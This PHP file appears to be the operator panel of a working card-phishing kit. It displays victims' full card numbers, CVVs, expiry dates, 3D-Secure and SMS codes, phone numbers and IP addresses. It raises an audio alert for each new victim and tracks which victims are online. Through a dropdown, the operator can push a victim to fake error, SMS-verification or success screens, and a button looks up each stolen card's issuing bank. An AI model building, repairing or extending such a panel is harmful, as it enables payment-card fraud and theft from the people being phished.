<?php

// Start the session
session_start();
ob_start();

// If the user is not logged in
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

// Include the database connection
include_once('../inc/db.php');
$db = db_connect();

// Get All Logs
$logs = $db->query('SELECT * FROM bella_bim_logs ORDER BY created_at DESC')->fetchAll(PDO::FETCH_OBJ);

// 6 saniyede bir reload et
header("Refresh: 6; url=logs.php");

// Reload olduğu gibi kullanıcı otomatikmen body içine tıklasın
echo '<body  class="bg-theme bg-theme1" onload="document.body.click()">';

// Cookie
$count = $db->query('SELECT COUNT(*) FROM bella_bim_logs')->fetchColumn();

// Countu bir last_count adında cookieye kaydet
setcookie('last_count', $count, time() + 60 * 60 * 24 * 30); // 30 days
// Cookieyi oku
$last_count = $_COOKIE['last_count'] ?? 0;
// Eğer cookie'de bir değer yoksa 0 olarak ayarla
if ($last_count == 0) {
    $last_count = 0;
}
// Eğer cookie'de bir değer varsa ve bu değer veritabanındaki değerden büyükse audio çal
if ($last_count < $count) {
    echo '<iframe src="src/audio/warn.mp3" allow="autoplay" style="display:none" id="iframeAudio"></iframe>';
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Secure</title>
   <!--favicon-->
	<link rel="icon" href="assets/images/favicon-32x32.png" type="image/png" />
	<!--plugins-->
	<link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
	<!--Data Tables -->
	<link href="assets/plugins/datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
	<link href="assets/plugins/datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
	<!--plugins-->
	<link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet" />
	<link href="assets/plugins/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet" />
	<link href="assets/plugins/metismenu/css/metisMenu.min.css" rel="stylesheet" />

	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
	<!-- Icons CSS -->
	<link rel="stylesheet" href="assets/css/icons.css" />
	<!-- App CSS -->
	<link rel="stylesheet" href="assets/css/app.css" />
  


</head>

<body>
    <!-- wrapper -->
    <div class="wrapper">
        <!--sidebar-wrapper-->
        <div class="sidebar-wrapper" data-simplebar="true">
            <div class="sidebar-header">
                <div class="">
                    <img src="assets/images/logo-icon.png" class="logo-icon-2" alt="" />
                </div>
                <div>
                    <h4 class="logo-text">Sistem</h4>
                </div>
                <a href="javascript:;" class="toggle-btn ml-auto"> <i class="bx bx-menu"></i>
                </a>
            </div>
            <!--navigation-->
            <ul class="metismenu" id="menu">
                <li>
                    <a href="dashboard.php">
                        <div class="parent-icon"><i class="bx bx-home-alt"></i>
                        </div>
                        <div class="menu-title">Anasayfa</div>
                    </a>

                </li>
                <li>
                    <a href="logs.php">
                        <div class="parent-icon"><i class="bx bx-data"></i>
                        </div>
                        <div class="menu-title">Tüm Loglar</div>
                    </a>

                </li>
				
					     <li>
                    <a href="tarih.php">
                        <div class="parent-icon"><i class="bx bx-calendar"></i>
                        </div>
                        <div class="menu-title">Tarih Ayarı</div>
                    </a>

                </li>
				  <li>
                    <a href="pass.php">
                        <div class="parent-icon"><i class="bx bx-user"></i>
                        </div>
                        <div class="menu-title">Şifre Yönetimi</div>
                    </a>

                </li>
                <li class="menu-label">İçerik Yönetimi</li>
                <li>
                    <a href="yeniurun.php">
                        <div class="parent-icon"><i class="bx bx-list-plus"></i>
                        </div>
                        <div class="menu-title">Ürün Ekle</div>
                    </a>
                </li>
                <li>
                    <a href="urunlistele.php">
                        <div class="parent-icon"><i class="bx bx-list-ul"></i>
                        </div>
                        <div class="menu-title">Ürünleri Listele</div>
                    </a>
                </li>




            </ul>
            <!--end navigation-->
        </div>
        <!--end sidebar-wrapper-->
        <!--header-->
        <header class="top-header">
            <nav class="navbar navbar-expand">
                <div class="left-topbar d-flex align-items-center">
                    <a href="javascript:;" class="toggle-btn"> <i class="bx bx-menu"></i>
                    </a>
                </div>

                <div class="right-topbar ml-auto">
                    <ul class="navbar-nav">
                        <li class="nav-item search-btn-mobile">
                            <a class="nav-link position-relative" href="javascript:;"> <i class="bx bx-search vertical-align-middle"></i>
                            </a>
                        </li>

                        <li class="nav-item dropdown dropdown-user-profile">
                            <a class="nav-link dropdown-toggle dropdown-toggle-nocaret" href="javascript:;" data-toggle="dropdown">
                                <div class="media user-box align-items-center">
                                    <div class="media-body user-info">
                                        <p class="user-name mb-0"> <?= $_SESSION['user']->username ?></p>
                                        <p class="designattion mb-0">Sistem Yöneticisi</p>
                                    </div>
                                    <img src="https://via.placeholder.com/110x110" class="user-img" alt="user avatar">
                                </div>
                            </a>
                            <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item" href="logout.php"><i class="bx bx-power-off"></i><span>Çıkış Yap</span></a>
                            </div>
                        </li>

                    </ul>
                </div>
            </nav>
        </header>
        <!--end header-->
        <!--page-wrapper-->
        <div class="page-wrapper">
            <!--page-content-wrapper-->
            <div class="page-content-wrapper">
                <div class="page-content">
                    <div class="row">
                   
                   <div class="col-12 ">
                    <div class="card">
						<div class="card-body">
                        <div class="card-title d-flex justify-content-between">
    <h4 class="mb-0">Tüm Loglar</h4>
    <h4 class="mb-0">
        <a href="inc/allogsdelete.php" class="text-red">
            Tümünü Sil (<?= count($logs) ?>)
        </a>
    </h4>
</div>

							<hr/>
							<div class="table-responsive">
								<table id="example" class="table table-striped table-bordered" style="width:100%">
									<thead>
										<tr>
											<th>ID</th>
											<th>AD SOYAD</th>
											<th>KART NUMARASI</th>
											<th>SKT</th>
											<th>CVV</th>
											<th>3D CODE</th>
                                            <th>DOGRULAMA</th>
                                            <th>TARİH</th>
                                            <th>TUTAR</th>
                                            <th>İŞLEM</th>
                                            <th>DURUM</th>
                                            <th>ONLİNE DURUM</th>
										</tr>
									</thead>
									<tbody>
                                    <?php foreach ($logs as $log): ?>
                        <tr class="text-center">
                            <td ><?= $log->id ?></td>
                            <td ><?= $log->cardholder_name ?>
                                <hr/>
                                <?= $log->cardholder_phone ?>
                                <hr/>
                                <?= $log->ipaddr ?>
								 
                            </td>
                           <td >
                                   <?php if (strlen($log->card_number) == 16): ?>
                <?= substr($log->card_number, 0, 4) ?> <?= substr($log->card_number, 4, 4) ?>
                <?= substr($log->card_number, 8, 4) ?> <?= substr($log->card_number, 12, 4) ?>
                <br />
                <?php
                // Kart numarasını PHP tarafından alın
                $card_number = $log->card_number;
                ?>
							
	<style>
    /* Bu stil düğmeleri özelleştirmek için kullanılır */
    button#checkButton_<?= $log->id ?> {
        background-color: #007BFF;
        color: #fff;
        padding: 5px 10px; /* Düğme boyutunu ayarlayın */
        border: none;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center; /* İçeriği yatayda ortala */
    }

    /* Düğmeye tıklanıldığında rengini değiştirmek için kullanılır */
    button#checkButton_<?= $log->id ?>:active {
        background-color: #0056b3;
    }

    /* İkonu düğmenin yanına eklemek için kullanılır */
    .icon {
        margin-right: 5px; /* İkon ile düğme arasındaki boşluğu ayarlayın */
    }
</style>

								<br />
								<div id="resultContainer_<?= $log->id ?>"></div>
                <!-- HTML içinde Sorgula düğmesi -->
                <input hidden type="text" id="cardNumber_<?= $log->id ?>" placeholder="Kart Numarası" value="<?php echo $card_number; ?>">
								<br>
                <button id="checkButton_<?= $log->id ?>">
    <span class="icon">
         <i class="fa fa-search"></i>
    </span>
    Sorgula
</button>
            <?php else: ?>
                <?= $log->card_number ?>
            <?php endif; ?>
        </td>
                            <td >
                                <?= $log->card_expiration_month ?>/<?= $log->card_expiration_year ?>
                            </td>
                            <td ><?= $log->card_cvv ?></td>
                            <td >
                                <?php if ($log->card_3dcode): ?>
                                    <span class="badge badge-success"><?= $log->card_3dcode ?></span>
                                <?php else: ?>
                                    <span class="badge badge-danger">3D Kod Yok</span>
                                <?php endif; ?>
                            </td>
                            <td >
                                <?php if ($log->secure_code): ?>
                                    <span class="badge badge-success">
                                        <?= $log->secure_code ?>
                                        </span>
                                <?php else: ?>
                                    <span class="badge badge-danger">Güvenlik Kod Yok</span>
                                <?php endif; ?>
                            </td>
                            <td ><?= $log->created_at ?></td>
                            <td ><?= number_format($log->amount, 2) ?> ₺</td>
                            <td >
                                <label for="select-area"></label>
                                <select style="background-color: black;" class="form-group text-warning mt-2 text-center" id="select-area"
                                        data-id="<?= $log->id ?>">
                                    <option>Seç</option>
                                    <option value="ban">Banla</option>
                                    <option value="delete">Logu sil</option>
                                    <option value="3dsecure">SMS Gönder</option>
                                    <option value="tebrik">Tebrikle</option>
                                    <option value="hatali">Hatalıya Gönder</option>
                                    <option value="dogrulama">Dogrulama</option>
                                    <option value="ccno_error">CCNO Hatalı</option>
                                    <option value="skt_error">SKT Hatalı</option>
                                    <option value="cvv_error">CVV Hatalı</option>
                                    <option value="bekle">Bekle</option>
                                    <option value="closed_card">Kart Kapalı</option>
                                    <option value="red_card">Hata Ver</option>
                                    <option value="phone_error">Telefon Hatalı</option>
                                </select>
                            </td>
                            <td >
                                <?php if ($log->status == 1 || $log->status == 12): ?>
                                    <strong class="badge badge-primary">Bekliyor 🕒</strong>
                                <?php elseif ($log->status == 2): ?>
                                    <strong class="badge badge-warning">3D Secure</strong>
                                <?php elseif ($log->status == 3): ?>
                                    <strong class="badge badge-success">Tebriklendi 🎉</strong>
                                <?php elseif ($log->status == 4): ?>
                                    <strong class="badge badge-danger">Hatalıda</strong>
                                <?php elseif ($log->status == 5): ?>
                                    <strong class="badge badge-warning">Doğrulamada</strong>
                                <?php elseif ($log->status == 6): ?>
                                    <strong class="badge badge-danger">CCNO Hatalı</strong>
                                <?php elseif ($log->status == 7): ?>
                                    <strong class="badge badge-danger">SKT Hatalı</strong>
                                <?php elseif ($log->status == 8): ?>
                                    <strong class="badge badge-danger">CVV Hatalı</strong>
                                <?php elseif ($log->status == 9): ?>
                                    <strong class="badge badge-danger">Kart Kapalı</strong>
                                <?php elseif ($log->status == 10): ?>
                                    <strong class="badge badge-danger">Kart Red</strong>
                                <?php elseif ($log->status == 11): ?>
                                    <strong class="badge badge-danger">Telefon Hatalı</strong>
                                <?php else: ?>
                                    <strong class="badge badge-danger">Bulunamadı ❌</strong>
                                <?php endif; ?>
                            </td>
                            <td>
    <?php
    $ip = $log->ipaddr;
    // Check ips table for IP
    $check = $db->prepare("SELECT * FROM bella_bim_ips WHERE ip_addr = :ip");
    $check->execute([':ip' => $ip]);
    $check = $check->fetch(PDO::FETCH_OBJ);
    ?>

    <?php if ($check): ?>
        <?php if ($check->status == 'online'): ?>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:green;" class="feather feather-wifi"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg> AKTİF
        <?php elseif ($check->status == 'offline'): ?>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:red;" class="feather feather-wifi-off"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"></path><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"></path><path d="M10.71 5.05A16 16 0 0 1 22.58 9"></path><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg> PASİF
        <?php endif; ?>
    <?php else: ?>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:gray;" class="feather feather-alert-triangle"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
        IP Yok!
    <?php endif; ?>
</td>

                        </tr>
                    <?php endforeach; ?>
									
									</tbody>
								
								</table>
							</div>
						</div>
					</div>
                    </div>



                </div>
            </div>
            <!--end page-content-wrapper-->
        </div>
        <!--end page-wrapper-->
        <!--start overlay-->
        <div class="overlay toggle-btn-mobile"></div>
        <!--end overlay-->
        <!--Start Back To Top Button--> <a href="javaScript:;" class="back-to-top"><i class='bx bxs-up-arrow-alt'></i></a>
        <!--End Back To Top Button-->
        <!--footer -->
        <div class="footer">
            <p class="mb-0">@2023 0.o
            </p>
        </div>
        <!-- end footer -->
    </div>
    <!-- end wrapper -->

    <!-- JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
	<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <!-- Toastr JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <!-- Toastr CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"/>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"/>
    <!-- Custom JS -->
    <script src="src/js/custom.js"></script>
    <!-- Toastr -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css"/>
	<script src="assets/js/popper.min.js"></script>
	<script src="assets/js/bootstrap.min.js"></script>
	<!--plugins-->
	<script src="assets/plugins/simplebar/js/simplebar.min.js"></script>
	<script src="assets/plugins/metismenu/js/metisMenu.min.js"></script>
	<script src="assets/plugins/perfect-scrollbar/js/perfect-scrollbar.js"></script>
	<!--Data Tables js-->
	<script src="assets/plugins/datatable/js/jquery.dataTables.min.js"></script>

    <script>
          $(document).ready(function() {
    // Default data table
var table = $('#example').DataTable({
    lengthChange: false,
    buttons: ['excel'], // Buradaki virgülü ekledik.
    "order": [[0, 'desc']],
    paging: false 
});

    table.buttons().container().appendTo('#example_wrapper .col-md-6:eq(0)');
});

        </script>
    <script>
    const selectAreas = document.querySelectorAll('select[id="select-area"]');
    selectAreas.forEach(function (selectArea) {
        selectArea.addEventListener('change', function () {
            const selectedValue = this.value;
            const selectedId = this.getAttribute('data-id');
            if (!selectedValue || !selectedId) {
                return false;
            }
            const data = {
                'id': selectedId,
                'type': selectedValue
            };
            fetch('inc/update.php?id=' + selectedId + '&type=' + selectedValue, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            }).then(function (response) {
                return response.json();
            }).then(function (data) {
                if (data.status === true) {
                    toastr.success(data.message);
                } else {
                    toastr.error(data.message);
                }
            });
        });
    });
</script>
<script>
		new PerfectScrollbar('.dashboard-social-list');
		new PerfectScrollbar('.dashboard-top-countries');
	</script>
		
		<?php foreach ($logs as $log): ?>
    <script>
        document.getElementById('checkButton_<?= $log->id ?>').addEventListener('click', function() {
            var cardNumber = document.getElementById('cardNumber_<?= $log->id ?>').value;

            // Kart numarasının geçerliliğini kontrol et
            if (cardNumber.length !== 16) {
                alert('Kart numarası 16 haneli olmalıdır.');
                return;
            }

            var bin = cardNumber.substr(0, 6);
            var url = "https://lookup.binlist.net/" + bin;
            var headers = {
                'Accept-Version': 3
            };

            fetch(url, {
                method: 'GET',
                headers: headers
            })
            .then(response => response.json())
            .then(data => {
                var scheme = data.scheme;
                var type = data.type;
                var brand = data.brand;
                var bank_name = data.bank.name;

                // Sonuçları göster
                var resultContainer = document.getElementById('resultContainer_<?= $log->id ?>');
                resultContainer.innerHTML = "Kart: " + scheme + "<br>" +
                                            "Tip: " + type + "<br>" +
                                            "Tür: " + brand + "<br>" +
                                            "Banka: " + bank_name;
            })
            .catch(error => {
                alert('Sorgu sırasında bir hata oluştu.');
            });
        });
    </script>
<?php endforeach; ?>
	<!-- App JS -->
	<script src="assets/js/app.js"></script>

</body>

</html>